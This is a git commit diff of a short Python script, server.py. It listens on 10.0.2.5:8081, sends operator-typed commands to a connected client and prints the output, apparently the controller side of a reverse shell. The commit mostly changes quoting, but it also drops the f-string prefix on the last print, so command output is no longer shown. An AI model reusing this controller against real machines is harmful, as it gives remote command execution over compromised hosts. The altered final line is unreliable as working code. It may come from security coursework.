c4c5560eb4a48e914deaf673e0fa13fb2851a917
albertuslaksana <89668012+albertuslaksana@users.noreply.github.com>
2023-03-07 19:56:48 -0600

    Update server.py

--- server.py
+++ server.py
@@ -1,20 +1,20 @@
 import socket
 
-HOST = '10.0.2.5' # '192.168.43.82'
-PORT = 8081 # 2222
+HOST = "10.0.2.5"
+PORT = 8081
 server = socket.socket()
 server.bind((HOST, PORT))
-print('[+] Server Started')
-print('[+] Listening For Client Connection ...')
+print("[+] Server Started")
+print("[+] Listening For Client Connection ...")
 server.listen(1)
 client, client_addr = server.accept()
-print(f'[+] {client_addr} Client connected to the server')
+print(f"[+] {client_addr} Client connected to the server")
 
 while True:
-    command = input('Enter Command : ')
+    command = input("Enter Command : ")
     command = command.encode()
     client.send(command)
-    print('[+] Command sent')
+    print("[+] Command sent")
     output = client.recv(1024)
     output = output.decode()
-    print(f"Output: {output}")
+    print("Output: {output}")
